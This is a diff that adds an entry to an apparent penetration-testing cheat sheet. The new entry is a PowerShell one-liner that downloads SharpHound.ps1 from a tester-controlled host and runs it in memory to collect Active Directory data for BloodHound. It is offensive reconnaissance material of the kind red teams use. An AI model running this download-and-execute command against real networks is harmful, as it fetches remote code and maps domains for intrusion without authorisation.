@@ -43,6 +43,14 @@ import-module sharphound.ps1
 invoke-bloodhound -collectionmethod all -domain <domain>
 ```
 
+## sharphound - collect bloodhound data download and execute
+#plateform/windows #target/remote #port/389 #port/631 #cat/RECON
+https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+
+```powershell
+(new-object system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>
+```
+
 ## cypheroth - start
 #plateform/linux #target/local #cat/RECON 
 Toolset that runs cypher queries against Bloodhound's Neo4j backend and saves output to spreadsheets.
